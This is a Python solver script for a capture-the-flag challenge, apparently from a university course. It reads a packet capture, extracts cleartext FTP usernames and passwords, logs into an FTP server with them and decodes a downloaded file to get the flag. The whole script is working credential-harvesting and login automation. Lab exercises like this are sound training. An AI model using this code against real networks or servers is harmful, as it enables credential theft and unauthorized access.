#!/usr/bin/env python3
"""
Solver for NET-02 "Intercepted Transcript"  (self-developed automation - LO3).

Automates the intended solve path:
  1. parse the captured pcap and recover the cleartext FTP USER / PASS
     (pure-Python pcap reader - no tshark/scapy needed)
  2. log in to the live Library Database FTP server with those credentials
  3. download the recovery file
  4. Base64-decode it to reveal the flag

Usage:
  python3 solve_net02.py --pcap challenge.pcap --host 10.10.20.50
  python3 solve_net02.py --pcap challenge.pcap --host 127.0.0.1 --port 2121
"""
import argparse
import base64
import io
import re
import struct
import sys
from ftplib import FTP

USER_RE = re.compile(rb"USER\s+([^\r\n]+)", re.I)
PASS_RE = re.compile(rb"PASS\s+([^\r\n]+)", re.I)
FLAG_RE = re.compile(r"SLIIT\{[^}]+\}")


def read_tcp_payloads(path):
    """Minimal libpcap reader: yields TCP payload bytes from each packet.
    Handles the standard Ethernet/IPv4/TCP (no-options) frames in our capture.
    """
    with open(path, "rb") as f:
        data = f.read()

    magic = data[:4]
    if magic in (b"\xd4\xc3\xb2\xa1", b"\xa1\xb2\xc3\xd4"):
        endian = "<" if magic == b"\xd4\xc3\xb2\xa1" else ">"
    else:
        raise ValueError("Not a classic .pcap file (magic mismatch)")

    off = 24  # global header
    payloads = []
    while off + 16 <= len(data):
        _ts, _tus, caplen, _orig = struct.unpack(endian + "IIII",
                                                 data[off:off + 16])
        off += 16
        frame = data[off:off + caplen]
        off += caplen
        if len(frame) < 14:
            continue
        # Ethernet
        ethertype = struct.unpack(">H", frame[12:14])[0]
        if ethertype != 0x0800:          # IPv4 only
            continue
        ip = frame[14:]
        if len(ip) < 20:
            continue
        ihl = (ip[0] & 0x0F) * 4
        proto = ip[9]
        if proto != 6:                    # TCP only
            continue
        tcp = ip[ihl:]
        if len(tcp) < 20:
            continue
        data_off = (tcp[12] >> 4) * 4
        payloads.append(tcp[data_off:])
    return payloads


def recover_creds(pcap):
    blob = b"".join(read_tcp_payloads(pcap))
    user = USER_RE.search(blob)
    pw = PASS_RE.search(blob)
    if not (user and pw):
        raise SystemExit("[-] Could not find USER/PASS in the capture.")
    return user.group(1).decode().strip(), pw.group(1).decode().strip()


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--pcap", required=True)
    ap.add_argument("--host", required=True)
    ap.add_argument("--port", type=int, default=21)
    ap.add_argument("--remote-file", default="db_recovery.txt")
    args = ap.parse_args()

    print(f"[*] Parsing {args.pcap} for cleartext FTP credentials...")
    user, pw = recover_creds(args.pcap)
    print(f"    [+] recovered USER: {user}")
    print(f"    [+] recovered PASS: {pw}")

    print(f"[*] Logging in to live FTP at {args.host}:{args.port}...")
    ftp = FTP()
    ftp.connect(args.host, args.port, timeout=10)
    ftp.login(user, pw)
    print("    [+] login OK:", ftp.getwelcome())

    buf = io.BytesIO()
    ftp.retrbinary(f"RETR {args.remote_file}", buf.write)
    ftp.quit()
    encoded = buf.getvalue().decode(errors="replace").strip()
    print(f"[*] Downloaded {args.remote_file} (Base64): {encoded}")

    decoded = base64.b64decode(encoded).decode(errors="replace")
    m = FLAG_RE.search(decoded)
    print("[+] FLAG:", m.group(0) if m else decoded)


if __name__ == "__main__":
    main()
